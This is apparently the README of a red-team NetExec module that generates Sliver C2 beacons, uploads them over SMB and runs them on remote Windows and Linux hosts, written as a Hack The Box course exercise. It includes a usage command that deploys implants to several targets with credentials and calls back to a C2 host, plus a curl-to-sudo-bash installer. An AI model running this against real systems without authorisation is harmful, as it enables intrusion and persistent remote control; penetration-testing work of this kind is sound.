
# Sliver NetExec Module

[![](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml)


This is a NetExec (formerly CrackMapExec) module that generates unique Sliver beacons and executes them on remote Windows/Linux targets via SMB.

## What it does

The `sliver_exec` module:
- Connects to a Sliver C2 server
- Generates unique implant beacons for target systems
- Uploads the implants to remote targets using SMB
- Executes the implants to establish persistent C2 beacons (Windows-only)
- Optionally waits for beacon check-in and cleans up artifacts

## Features

- Automatic OS and architecture detection
- Support for Windows and Linux targets
- Unique implant generation per execution
- Configurable cleanup and timeout options
- Direct SMB upload

## Requirements

- NetExec (nxc) installed
- Sliver C2 server running
- Valid Sliver client configuration

## Architecture

### Lazy Loading of Protobuf Dependencies

This module uses lazy loading for Sliver protobuf bindings to ensure compatibility with NetExec's module discovery system. When NetExec lists available modules (e.g., `nxc smb -L`), it imports each module to extract metadata like descriptions and options. Since NetExec's environment doesn't include Sliver protobuf bindings, the module must be importable without immediately requiring these dependencies.

**Why lazy loading is necessary:**

- **NetExec compatibility**: NetExec environments don't include Sliver protobuf bindings, so modules must be importable for listing without external dependencies
- **Module discovery**: Allows NetExec to load module metadata without triggering protobuf imports
- **Path isolation**: Uses protobuf bindings from the module's local `src/` directory rather than requiring system-wide installation

**Performance context:**

The original test slowdown (~116s collection time) was caused by including the full NetExec environment in the project's development venv, not by protobuf loading overhead. Lazy loading here serves compatibility rather than performance optimization.

## Installation

### For Development

Install from source:

```bash
git clone https://github.com/moerketh/sliver-netexec-module.git
cd sliver-netexec-module
poetry install
```

### For NetExec Usage

After installing NetExec, install this module into NetExec's environment:

```bash
# Build the package
poetry build

# Install into NetExec's pipx environment (if using pipx)
pipx inject netexec dist/sliver_nxc_module-0.1.0-py3-none-any.whl

# Or install directly with pip if NetExec is installed globally
pip install dist/sliver_nxc_module-0.1.0-py3-none-any.whl
```

**Note:** This package includes pre-generated Sliver protobuf bindings, so you don't need to install `sliver-py` or generate protobuf files locally.

### NetExec Setup

Install NetExec if you haven't already:

```bash
pip install netexec
```

Or on HTB PwnBox:

```bash
# Remove pip-installed netexec if present
sudo pip3 uninstall -yqq netexec

# Install netexec via pipx
sudo apt install -y pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Sliver Setup

```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash
cp .sliver-client/configs/${USER}_localhost.cfg .sliver-client/configs/default.cfg

# Tip: Add a bypass to proxychains to be able to reach the Sliver Server
echo "localnet 127.0.0.0/255.0.0.0" | sudo tee -a /etc/proxychains.conf
```

## Usage

### Basic usage:
Command
```bash
nxc smb 10.2.10.10 10.2.10.11 10.2.10.12 -u localuser -p password -M sliver_exec -o RHOST=192.168.1.100 RPORT=443
```
Output:

![](./assets/example.svg)

### Available options:
- `RHOST`: Target IP address (required)
- `RPORT`: Sliver listener port (default: 443)
- `OS`: Target OS (windows/linux, auto-detected if not specified)
- `ARCH`: Target architecture (amd64/386, auto-detected if not specified)
- `IMPLANT_BASE_PATH`: Local base path for temp files (default: /tmp)
- `CLEANUP`: Remove implant after execution (default: True)
- `WAIT`: Seconds to wait for beacon check-in (default: 30)
- `FORMAT`: Implant format (default: exe, only exe supported)

## Configuration

The module requires a Sliver client configuration file. By default, it looks for:
- `~/.sliver-client/configs/default.cfg`

You can specify a custom config path in your NetExec config under the `[Sliver]` section:
```ini
[Sliver]
config_path = /path/to/your/sliver/config.cfg
```

## Information

This module was written as an exercise as part of the CrackMapExec course in the **Active Directory Penetration Expert Course** on Hack The Box.

## Development

For contributors who want to modify the protobuf bindings:

```bash
# Install in development mode
poetry install

# Regenerate protobuf bindings (requires sliver-source submodule)
poetry run generate-protobuf
```

## Testing

Run the test suite:
```bash
poetry run pytest
```

Or run specific tests:
```bash
poetry run pytest tests/test_protobuf.py
```
